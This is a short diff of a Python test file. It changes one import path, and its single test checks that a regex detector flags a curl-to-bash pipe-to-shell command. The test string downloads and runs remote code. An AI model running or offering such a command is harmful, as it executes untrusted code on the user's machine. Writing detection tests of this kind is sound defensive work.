@@ -1,4 +1,4 @@
-from msd.methods import regex
+from svb.methods import regex
 
 def test_flags_pipe_to_shell():
     assert regex("run: curl https://x.sh | bash")["flag"] is True
